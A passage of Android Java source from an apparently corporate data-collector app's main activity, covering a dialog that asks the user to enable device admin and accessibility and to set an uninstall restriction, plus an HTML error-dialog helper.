//        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
//        builder.setView(view);
//
//
//        final AlertDialog alertDialog = builder.create();
//
//        alertDialog.setCancelable(false);
//
//        if (alertDialog.getWindow() != null) {
//            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
//        }
//        alertDialog.show();
//
//    }



    public void showAdminAlert() {

        boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);

        Log.d(TAG, "showAdminAlert: Enabled " + isRestrictionEnabled);

        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_startup);

        // Use Activity context to inflate layout
        View view = LayoutInflater.from(MainActivity.this).inflate(R.layout.disable_app_uninstallation, relativeLayoutAlert, false);

        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        TextView tvAdmin = view.findViewById(R.id.tv_admin_turnOn);
        TextView tvAccessibility = view.findViewById(R.id.tv_accessibility_turn_on);
        TextView tvSetRestriction = view.findViewById(R.id.setRestriction);

        if (isAccessibilityEnabled) {
            tvAccessibility.setVisibility(View.GONE);
        }

        if (isDeviceAdminEnabled) {
            tvAdmin.setVisibility(View.GONE);
        }

        if (isRestrictionEnabled) {
            tvSetRestriction.setVisibility(View.GONE);
        }

        final AlertDialog alertDialog = builder.create();

        tvAdmin.setOnClickListener(v -> {
            enableDeviceAdmin(); // Launch from Activity context
            alertDialog.dismiss();
        });

        tvAccessibility.setOnClickListener(v -> {
            alertDialog.dismiss();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        tvSetRestriction.setOnClickListener(v -> {
            SharedPrefs.setRestrictionEnabled(this);
            alertDialog.dismiss();
        });

        alertDialog.setCancelable(true);

        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }

        alertDialog.show();
    }


    @Override
    protected void onResume() {
        super.onResume();
        loadProfileTV();
        checkMissingPermissions();
    }


    private void enableDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        // Explicitly set the fully qualified class name of the receiver
        ComponentName adminComponent = new ComponentName(
                "android.iocl.dac_collector", // your package name
                "android.iocl.dac_collector.Receivers.AdminReceiver" // full class path
        );

        if (dpm.isAdminActive(adminComponent)) {
            Toast.makeText(this, "Already Device Admin", Toast.LENGTH_SHORT).show();
            return;
        }

        Log.d("DeviceAdmin", "Attempting to start Device Admin intent");

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for secure features like password reset and lock.");
        startActivity(intent); // Must be from Activity, not application context
    }


    private boolean isHtml(String input) {
        return input != null && input.matches(".*\\<[^>]+>.*");
    }

    private void showHtmlDialog(String title, String htmlContent) {
        // Convert HTML → Spanned → plain String (all tags & styling dropped)
        String plain = Html.fromHtml(htmlContent, Html.FROM_HTML_MODE_LEGACY)
                .toString()
                .trim();

        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(plain)
                .setPositiveButton("OK", null)
                .show();
    }

    @Override
    public void onResponse(String url, String body) {


        runOnUiThread(() -> {
            if (isHtml(body)) {
                showHtmlDialog("Error", body);
            }
        });


    }


}
